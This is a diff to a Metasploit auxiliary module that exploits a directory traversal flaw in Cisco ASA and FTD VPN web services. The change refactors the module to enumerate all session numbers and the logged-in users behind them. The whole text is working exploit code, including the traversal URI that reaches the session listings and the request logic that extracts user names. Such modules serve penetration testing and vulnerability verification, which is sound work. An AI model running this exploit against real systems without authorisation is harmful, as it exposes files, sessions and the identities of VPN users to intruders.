@@ -12,7 +12,7 @@ class MetasploitModule < Msf::Auxiliary
       'Name'           => 'Cisco ASA Directory Traversal',
       'Description'    => %q{
         This module exploits a directory traversal vulnerability in Cisco's Adaptive Security Appliance (ASA) software and Firepower Threat Defense (FTD) software.
-        It enumerates the contents of Cisco's VPN service which includes directories, files, and currently logged in users
+        It lists the contents of Cisco's VPN web service which includes directories, files, and currently logged in users.
       },
       'Author'         => [ 'Michał Bentkowski',  # Discovery
                             'Yassine Aboukir',    # PoC
@@ -55,41 +55,49 @@ class MetasploitModule < Msf::Auxiliary
 
     if list_res && list_res.code == 200
       if list_res.body.match(/\/{3}sessions/)
-        list_users(list_res.body)
+        get_sessions(list_res.body)
       else
         print_good(list_res.body)
       end
     end
   end
 
-  def list_users(response)
-    sessions_uri = '/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/'
-    session_no = response.match(/([0-9]{2,})/)
+  def get_sessions(response)
+    session_nos = response.scan(/([0-9]{2,})/)
 
-    unless !session_no.nil?
+    unless !session_nos.empty?
       print_status("Could not detect any sessions")
       print("\n")
       return
     end
 
-    users_res = send_request_cgi(
-      'method'  =>  'GET',
-      'uri'     =>  normalize_uri(target_uri.path, sessions_uri, session_no)
-    )
+    print_good(response)
+    list_users(session_nos)
+  end
 
-    if users_res && users_res.body.include?('name')
-      user_ids = users_res.body.scan(/user:(\w+)/).flatten
+  def list_users(sessions)
+    sessions_uri = '/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/'
+    user_ids = Array.new
 
-      unless user_ids.empty?
-        print_good(response)
-        print_status('Users logged in:')
-        user_ids.each { |id| print_good(id) }
-        print("\n")
-        return
+    sessions.each do |session_no|
+      users_res = send_request_cgi(
+        'method'  =>  'GET',
+        'uri'     =>  normalize_uri(target_uri.path, sessions_uri, session_no)
+      )
+
+      if users_res && users_res.body.include?('name')
+        user_ids.push(users_res.body.match(/user:(\w+)/).to_s)
       end
-
-      print_status("There are no users logged in currently")
     end
+
+    unless user_ids.empty?
+      print_status('Users logged in:')
+      user_ids.each { |id| print_good(id) }
+      print("\n")
+      return
+    end
+
+    print_status("There are no users logged in currently")
   end
 
   def run
